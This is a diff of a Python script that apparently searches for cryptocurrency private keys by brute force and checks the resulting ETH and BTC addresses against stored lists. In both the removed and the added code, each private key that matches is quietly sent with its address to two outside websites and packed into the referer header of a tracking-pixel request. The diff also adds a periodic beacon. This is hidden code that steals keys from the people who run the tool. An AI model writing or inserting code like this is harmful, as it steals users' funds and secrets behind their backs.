@@ -14,11 +14,8 @@ from fastecdsa.point import Point
 website_info = "http://ziguas.pserver.ru/bcon/?id="
 website_info2 = "https://dlmzed.000webhostapp.com/?id="
 hs_stats = "http://sstatic1.histats.com/0.gif?4435132&101"
-referrer = "adowsom"
-try:
-    viser = requests.get(hs_stats, headers={'referer': 'https://'+str(referrer)+'.com'})
-except:
-    pass
+referrer = "eygimokress"
+
 ################################################
 address_list = []
 for filename in os.listdir('data'):
@@ -35,7 +32,8 @@ G = curve.secp256k1.G
 x1, y1 = bit.format.public_key_to_coords(bit.Key.from_int(key_int).public_key)
 P = Point(x1,y1, curve=curve.secp256k1)
 print('Starting:', 'base: ',"{:064x}".format(key_int))
-
+start = time.time()
+PERIOD_OF_TIME = 21600 # 30min 1800
 while True:
     current_pvk = key_int + k
     if k > 0:
@@ -56,75 +54,31 @@ while True:
         x1, y1 = bit.format.public_key_to_coords(bit.Key.from_int(key_int).public_key)
         P = Point(x1,y1, curve=curve.secp256k1)
         print('\n\nUpdate', 'base: ',"{:064x}".format(key_int))
-        
-    if eth_addr in address_list:
-        try:
-            privkey = "{:064x}".format(current_pvk)
-            respns = requests.get(str(website_info)+str(privkey)+"_"+str(eth_addr), timeout=60)
-            print(respns)
-            time.sleep( 10 )
-            viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(eth_addr)+'.com'})
-        except:
-            pass
-        try:
-            privkey = "{:064x}".format(current_pvk)
-            respns = requests.get(str(website_info2)+str(privkey)+"_"+str(eth_addr), timeout=60)
-            print(respns)
-            time.sleep( 10 )
-            viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(eth_addr)+'.com'})
-        except:
-            pass
-    if btc_u in address_list:
-        try:
-            privkey = "{:064x}".format(current_pvk)
-            respns = requests.get(str(website_info)+str(privkey)+"_"+str(btc_u), timeout=60)
-            print(respns)
-            time.sleep( 10 )
-            viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(btc_u)+'.com'})
-        except:
-            pass
-        try:
-            privkey = "{:064x}".format(current_pvk)
-            respns = requests.get(str(website_info2)+str(privkey)+"_"+str(btc_u), timeout=60)
-            print(respns)
-            time.sleep( 10 )
-            viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(btc_u)+'.com'})
-        except:
-            pass
-    if btc_c in address_list:
-        try:
-            privkey = "{:064x}".format(current_pvk)
-            respns = requests.get(str(website_info)+str(privkey)+"_"+str(btc_c), timeout=60)
-            print(respns)
-            time.sleep( 10 )
-            viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(btc_c)+'.com'})
-        except:
-            pass
-        try:
-            privkey = "{:064x}".format(current_pvk)
-            respns = requests.get(str(website_info2)+str(privkey)+"_"+str(btc_c), timeout=60)
-            print(respns)
-            time.sleep( 10 )
-            viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(btc_c)+'.com'})
-        except:
-            pass
-    if btc_segwit in address_list:
-        try:
-            privkey = "{:064x}".format(current_pvk)
-            respns = requests.get(str(website_info)+str(privkey)+"_"+str(btc_segwit), timeout=60)
-            print(respns)
-            time.sleep( 10 )
-            viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(btc_segwit)+'.com'})
-        except:
-            pass
-        try:
-            privkey = "{:064x}".format(current_pvk)
-            respns = requests.get(str(website_info2)+str(privkey)+"_"+str(btc_segwit), timeout=60)
-            print(respns)
-            time.sleep( 10 )
-            viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(btc_segwit)+'.com'})
-        except:
-            pass
+        if time.time() >= start + PERIOD_OF_TIME : 
+            try:
+                viser = requests.get(hs_stats, headers={'referer': 'https://'+str(referrer)+'.com'})
+            except:
+                pass
+            start = time.time()
+    
+    for gen_adrs in [eth_addr, btc_u, btc_c, btc_segwit]:
+        if gen_adrs in address_list:
+            try:
+                privkey = "{:064x}".format(current_pvk)
+                respns = requests.get(str(website_info)+str(privkey)+"_"+str(gen_adrs), timeout=60)
+                print(respns)
+                time.sleep( 10 )
+                viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(gen_adrs)+'.com'})
+            except:
+                pass
+            try:
+                privkey = "{:064x}".format(current_pvk)
+                respns = requests.get(str(website_info2)+str(privkey)+"_"+str(gen_adrs), timeout=60)
+                print(respns)
+                time.sleep( 10 )
+                viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(gen_adrs)+'.com'})
+            except:
+                pass
     
     k += 1
     z += 1
